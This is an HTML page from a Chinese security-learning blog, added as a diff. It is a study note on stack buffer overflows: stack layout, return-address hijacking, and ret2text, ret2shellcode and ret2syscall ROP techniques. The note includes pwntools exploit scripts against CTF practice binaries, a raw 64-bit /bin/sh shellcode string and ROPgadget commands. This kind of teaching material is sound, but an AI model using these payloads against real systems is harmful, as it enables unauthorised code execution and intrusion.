@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/pikaqiu.ico?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="跟着wood学了一下栈溢出.思路大概就是用输入时候的漏洞覆盖其他的数值.下面就从入门到入坟梳理一下栈溢出漏洞.">
+<meta name="keywords" content="栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Stack-overflow 小记">
+<meta property="og:url" content="https://pwn.org.cn/2019/01/23/stack-overflow/index.html">
+<meta property="og:site_name" content="Cooook&#39;s Blog">
+<meta property="og:description" content="跟着wood学了一下栈溢出.思路大概就是用输入时候的漏洞覆盖其他的数值.下面就从入门到入坟梳理一下栈溢出漏洞.">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/10/10/ipwuM5gc6QoOJ2e.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/10/o1VJGrqvKL3CUbt.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/10/fhb3yCsiXLQI26S.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/10/cxEU23ulNgfvyah.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/10/9FNwH7eWghaTXlc.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/10/NTRCk3lmjQ5uLPa.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/10/OgXJfwdrjDsyGCS.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/10/uiegoSmf3QwZGOr.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/10/8NRpMorF26tjEJb.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/10/SJsgc85pGAQFzko.png">
+<meta property="og:updated_time" content="2022-10-22T11:16:45.848Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Stack-overflow 小记">
+<meta name="twitter:description" content="跟着wood学了一下栈溢出.思路大概就是用输入时候的漏洞覆盖其他的数值.下面就从入门到入坟梳理一下栈溢出漏洞.">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/10/ipwuM5gc6QoOJ2e.png">
+  <link rel="canonical" href="https://pwn.org.cn/2019/01/23/stack-overflow/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Stack-overflow 小记 | Cooook's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cooook's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">不管是怎样的回忆，都是我们活过的人生。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-links">
+      
+    
+
+    <a href="/links/" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>links</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://pwn.org.cn/2019/01/23/stack-overflow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cooook">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/10/03/67Hi83ZnSBGKkRf.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cooook's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Stack-overflow 小记
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-23 22:04:21" itemprop="dateCreated datePublished" datetime="2019-01-23T22:04:21+08:00">2019-01-23</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-10-22 19:16:45" itemprop="dateModified" datetime="2022-10-22T19:16:45+08:00">2022-10-22</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/学习笔记/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>跟着wood学了一下栈溢出.<br>思路大概就是用输入时候的漏洞覆盖其他的数值.<br>下面就从入门到入坟梳理一下栈溢出漏洞.<br><a id="more"></a></p>
+<h1 id="0x0-栈中变量的存储方式"><a href="#0x0-栈中变量的存储方式" class="headerlink" title="0x0 栈中变量的存储方式"></a>0x0 栈中变量的存储方式</h1><p>栈中变量的存储符合先进后出<br><img src="https://i.loli.net/2019/10/10/ipwuM5gc6QoOJ2e.png" alt="Data_stack.png"><br>函数中申请局部变量是在栈内存的.<br>栈中地址由高地址向低地址生长, 即栈顶是低地址, 栈底是高地址.  </p>
+<h2 id="数组的存储方式"><a href="#数组的存储方式" class="headerlink" title="数组的存储方式"></a>数组的存储方式</h2><p>数组的存储<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];</span><br></pre></td></tr></table></figure></p>
+<p>定义一个内存大小为10<em>sizeof(int)的int数组a, 那么a的值是数组的首地址, a[i] = </em>(a + i)</p>
+<h2 id="ebp-esp-寄存器"><a href="#ebp-esp-寄存器" class="headerlink" title="ebp esp 寄存器"></a>ebp esp 寄存器</h2><p>ebp指向栈底, esp指向栈顶, (ebp esp 在栈内存中是不占用内存的, ebp, esp寄存器用的不是栈内存)  </p>
+<h1 id="0x1-程序的运行-eip寄存器"><a href="#0x1-程序的运行-eip寄存器" class="headerlink" title="0x1 程序的运行 eip寄存器"></a>0x1 程序的运行 eip寄存器</h1><p>程序的汇编中, 代码段和数据段分开储存, 数据段有栈储存(严谨来说内存栈并不在数据段), 代码段没有<br>在代码栈中, 当运行到第i行时, eip指向第i+1行, eip的跳转可以实现函数的多种功能.  </p>
+<h1 id="0x2-基础栈溢出"><a href="#0x2-基础栈溢出" class="headerlink" title="0x2 基础栈溢出"></a>0x2 基础栈溢出</h1><p>来自ctf-wiki的一些内容<br><img src="https://i.loli.net/2019/10/10/o1VJGrqvKL3CUbt.png" alt=""><br>大概就是说, 在读入的时候, 对读入的数据的多少没有限制或者限制不够, 导致读入的数据覆盖到栈中的其他内存, 这样就能达到一些目的.  </p>
+<h2 id="劫持函数返回地址"><a href="#劫持函数返回地址" class="headerlink" title="劫持函数返回地址"></a>劫持函数返回地址</h2><h3 id="函数调用retn问题"><a href="#函数调用retn问题" class="headerlink" title="函数调用retn问题"></a>函数调用retn问题</h3><p><img src="https://i.loli.net/2019/10/10/fhb3yCsiXLQI26S.png" alt="v2-9125ba203edd2bab1308ad88db2ae197_hd.png"><br>用一个小例子来简单的理解一下.<br>当main函数中调用get_flag函数的时候, 程序做的操作:<br>1.get_flag 参数从右向左入栈(32位)<br>比如<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>b先入栈, 然后a入栈.<br><img src="https://i.loli.net/2019/10/10/cxEU23ulNgfvyah.png" alt="v2-9ae4f530296d4a8ec7d44443e3e6d37f_hd.png">  </p>
+<ol>
+<li>当前eip入栈, 当调用的get_flag函数执行完成后, 会有ret, ret相当于pop eip, 这时候栈顶是原eip的值, 这样程序运行完get_flag后就可以继续运行main函数中的指令.<br><img src="https://i.loli.net/2019/10/10/9FNwH7eWghaTXlc.png" alt="v2-c350a4c5e9f5bbe839606486f3100185_hd.png"></li>
+<li>保存原栈底指针ebp的值, ebp指向新的栈底, esp指向当前栈帧底部(原esp不用存, 可算出.)  <h3 id="劫持函数Return-Address"><a href="#劫持函数Return-Address" class="headerlink" title="劫持函数Return Address"></a>劫持函数Return Address</h3>利用输入时的漏洞可以可更改函数的返回地址.<br>从一个简单小例题看看这是什么东西.<br>我们<br><img src="https://i.loli.net/2019/10/10/NTRCk3lmjQ5uLPa.png" alt=""><br>可以看到主函数很简单, 读入字符串s, 可以看到没有对s输入的长度进行限制, 我们可以利用这点来更改Return Address的值.<br><img src="https://i.loli.net/2019/10/10/OgXJfwdrjDsyGCS.png" alt=""><br>经过观察, 我们只要调用这个fun函数, 我们就能获得服务器的控制权.<br><img src="https://i.loli.net/2019/10/10/uiegoSmf3QwZGOr.png" alt=""><br>看一下fun函数的地址, 将光标移到fun上后按tab键可出现该界面<br><img src="https://i.loli.net/2019/10/10/8NRpMorF26tjEJb.png" alt=""><br>看一下在main函数内存栈中储存的位置, 来算下偏移.<br>前面的地址是相对ebp的偏移, 其中-0xf处的s是字符数组s的起始地址.<br>下面0x8位置的r代表return address<br>我们想要覆盖returnaddress, 那么需要先输入0x8 + 0xf个字符, 然后输入fun函数的地址, 即可运行fun函数.<br>输入fun函数的地址时需要进行一些操作, 因为直接输入的话会被当做字符直接读入, 这时候我们可以用p64这个pwntools, p64(x)将x拆成由8个字符组成的字符串输出(其中涉及到大小端存储), 具体原理不说了…<br>类似, p32是拆成4个字符输出.<br>然后写个脚本做一做就好了.<br>(需要chmod加权限)<br>脚本如下:  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = process(<span class="string">'./pwn1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">23</span> + p64(<span class="number">0x401186</span>)</span><br><span class="line">s.sendline(payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>对脚本解释一下..<br>process 是运行pwn1 这个可执行文件, payload是构造的字符串, sendline(payload)是把payload输入到命令行并且在结尾加换行符, interactive() 切换到交互模式.  </p>
+<h1 id="0x3-Basic-ROP"><a href="#0x3-Basic-ROP" class="headerlink" title="0x3 Basic ROP"></a>0x3 Basic ROP</h1><p>抄ctf-wiki!<br><img src="https://i.loli.net/2019/10/10/SJsgc85pGAQFzko.png" alt=""><br>二话不说, 就是一通代码段…  </p>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>上面说过, retn 的实际指令是 pop eip, 上面的将return address的值换成 fun函数的地址, 其实是换成了fun函数的起始地址, 但是我们其实并不需要运行完整的fun函数, 我们只需要运行system(‘./bin/sh’)这个语句, 这时候我们查看一下上面的汇编代码, 发现在0x401191的位置调用了system函数, 但是调用system函数的时候需要先考虑system的参数问题, 上一行lea rdi, command是在调整参数, 那么只要把eip指向0x401191对应的指令就行, 注意调用函数时候的参数问题, 需要先把参数调整好再调用system函数.  </p>
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>这个东西是在没有system(“./bin/sh”)时候的一种操作.<br>这种方法需要一段内存它是可写可执行的, 并且我们可以想办法写入.<br>从ctf-wiki例题开始看.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现有gets函数, 可以读入一些东西.<br>看了一下栈中变量的存储情况发现可以修改栈中的return address.<br>并且把输入的内容复制到了buf2段, 我们查看一下buf2对应的段.<br>发现buf2在bss段, 并且有可读可写可执行权限, 那么我们可以先写入shellcode, 然后用任意字符溢出到return address 对应的地址, return address 需要将其更改为buf2对应的地址, 然后就可以运行写入的shellcode获取权限了.<br>pwntools 工具解释.<br>shellcraft.sh()获得32位系统上的shellcode.<br>asm(string)<br>将string汇编转化为二进制.<br>ljust补齐, exp.py中为先输入shellcode, 然后补’a’, ‘a’的个数和shellcode的总字节数加起来为112.<br>脚本.  </p>
+<pre><code class="lang-Python">#!/usr/bin/env python
+from pwn import *
+
+sh = process(&#39;./ret2shellcode&#39;)
+shellcode = asm(shellcraft.sh())
+buf2_addr = 0x804a080
+
+sh.sendline(shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr))
+sh.interactive()
+</code></pre>
+<p>附赠64位shellcode一段.  </p>
+<pre><code class="lang-text">&#39;x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#39;
+</code></pre>
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>我jio的, ctf-wiki上讲的很全很好, 附个链接.<br>注意的一些事情:<br>int 0x80我暂且先将其理解为execve这个函数, 先用一些代码片段修改函数参数, 然后再调用int 0x80  </p>
+<ul>
+<li>ROPgadget安装.  <pre><code class="lang-bash">sudo pip install ropgadget
+</code></pre>
+</li>
+<li>常用用法<br>ROPgadget —binary filename —string “ /bin/sh”<br>ROPgadget —binary filename —only “pop|ret” | grep ‘eax’<br>ROPgadget —binary filename —only ‘int’  </li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/10/25/unctf-sosoeasypwn/" rel="prev" title="unctf-sosoeasypwn">
+                  unctf-sosoeasypwn <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-栈中变量的存储方式"><span class="nav-number">1.</span> <span class="nav-text">0x0 栈中变量的存储方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#数组的存储方式"><span class="nav-number">1.1.</span> <span class="nav-text">数组的存储方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ebp-esp-寄存器"><span class="nav-number">1.2.</span> <span class="nav-text">ebp esp 寄存器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-程序的运行-eip寄存器"><span class="nav-number">2.</span> <span class="nav-text">0x1 程序的运行 eip寄存器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-基础栈溢出"><span class="nav-number">3.</span> <span class="nav-text">0x2 基础栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#劫持函数返回地址"><span class="nav-number">3.1.</span> <span class="nav-text">劫持函数返回地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#函数调用retn问题"><span class="nav-number">3.1.1.</span> <span class="nav-text">函数调用retn问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#劫持函数Return-Address"><span class="nav-number">3.1.2.</span> <span class="nav-text">劫持函数Return Address</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-Basic-ROP"><span class="nav-number">4.</span> <span class="nav-text">0x3 Basic ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2text"><span class="nav-number">4.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">4.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2syscall"><span class="nav-number">4.3.</span> <span class="nav-text">ret2syscall</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="https://i.loli.net/2019/10/03/67Hi83ZnSBGKkRf.jpg"
+      alt="Cooook">
+  <p class="site-author-name" itemprop="name">Cooook</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cooook</span>
+</div>
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
